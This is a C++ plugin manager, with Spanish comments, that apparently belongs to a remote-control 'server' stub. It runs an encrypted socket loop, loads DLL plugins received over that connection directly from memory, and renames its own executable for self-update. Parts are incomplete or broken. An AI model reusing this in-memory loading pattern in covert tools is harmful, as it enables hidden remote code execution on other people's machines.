#include <stdio.h>

#include "PluginManager.h"
#include "plugininterface.h"

PluginManagerInterfacePrivate* PluginManager::pluginList;

class PluginManagerInterfacePrivate :public pluginManagerInterface{
        PluginManager* mgr;
        plugin* p;
    public:
        PluginManagerInterfacePrivate(PluginManager& mgr, plugin& p);
        plugin* getPlugInformation();
        virtual int sendData(const char* data,uint size);
        virtual int setErrorCode(uint code);
};

PluginManager::PluginManager(){
    pluginList = 0;
}

PluginManager::~PluginManager(){
    if(pluginList){
        printf("unloading plugin\n");
        this->lFunc->FreeLibraryFromMemoy(pluginList->getPlugInformation()->hModule);
    }
}

uint PluginManager::run(SOCKET hConexion, HCRYPTKEY hKey, LoaderFunTable &lFunc){
    RPEP client(hConexion,hKey,this);
    protocol = &client;
    //printf("despues de client\n");

    this->lFunc = &lFunc;

    //MessageBoxA(0, "PluginManager::run", "DLL Message", MB_OK | MB_ICONINFORMATION);
    return client.serverLoop();
}

bool PluginManager::updateServer(DArray& newServer){
    char FileName[1024];
    char FileNameNew[1024];
    long FilenameSize;
    FilenameSize = GetModuleFileName(0,FileName,sizeof(FileName)-1);

    strcpy(FileNameNew,FileName);
    FileNameNew[FilenameSize] = '_';
    FileNameNew[FilenameSize+1] = 0;

    MoveFile(FileName,FileNameNew);

    return true;
}
bool PluginManager::loadPlugin(RPEP_LOAD_PLUGIN* pluginModule){
    pgetInterface getInterface;
    HINSTANCE hModule;
    plugin* newPlugin;
    PluginManagerInterfacePrivate* pluginPrivate;
    bool result = false;

    if(!isPluginLoad(pluginModule->PluginID)){
        printf("Cargando plugin....\n");
        newPlugin = new plugin();
        //Cargamos el plugin
        if((newPlugin->hModule = hModule = lFunc->LoadLibraryFromMemoy(pluginModule->PluginModule,""))){
            //Buscamos las funciones exportadas
            getInterface = (pgetInterface)GetProcAddress(hModule,"getInterface");
            if((newPlugin->plugInterface = getInterface())){
                newPlugin->ID = pluginModule->PluginID;
                pluginPrivate = new PluginManagerInterfacePrivate(*this,*newPlugin);
                pluginList = pluginPrivate;
                result = true;
            }else delete newPlugin;
        }
    }else printf("ya cargado");

    printf("Cargado plugin: %s\n",result?"true":"false");
    return result;
}
plugin* PluginManager::getPluginById(ulong id){
    return pluginList->getPlugInformation();
}

RPEP *PluginManager::getProtocol(){
    return protocol;
}

bool PluginManager::isPluginLoad(ushort ID){
    bool result = false;
    if(pluginList && pluginList->getPlugInformation()){
        result = pluginList->getPlugInformation()->ID == ID;
    }
    return result;
}

PluginManagerInterfacePrivate::PluginManagerInterfacePrivate(PluginManager &mgr, plugin &p){
    this->mgr = &mgr;
    this->p = &p;
    p.plugInterface->setPluginManager(this);
}

plugin* PluginManagerInterfacePrivate::getPlugInformation(){
    return p;
}

int PluginManagerInterfacePrivate::sendData(const char *data, uint size){
    DArray buff;

    this->mgr->getProtocol()->MakePacket(buff,this->p->ID,data,size);

    return this->mgr->getProtocol()->send(buff.data,buff.size);
}

int PluginManagerInterfacePrivate::setErrorCode(uint code){
}
